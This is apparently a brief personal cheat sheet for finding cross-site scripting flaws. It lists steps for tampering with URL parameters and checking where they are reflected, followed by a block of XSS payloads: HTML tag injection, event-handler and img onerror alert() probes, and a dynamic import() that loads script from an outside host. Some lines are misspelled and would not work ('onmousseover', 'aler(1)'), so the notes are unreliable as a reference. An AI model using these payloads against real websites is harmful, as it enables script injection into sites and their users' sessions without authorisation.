Cross Site Scripting
**$STEPS$**: 
- Check all URLs
- Change urls (https for https, or a parameter)
- if u change one parameter or url, look for it on dev tools > html
- 
**Examples:**
```javascript
"><u>test123

<u/onmousseover=alert(1)>test123

<img src=x onerror=alert(1)>

1.js
aler(1)

import('https://site.com/1.js')
```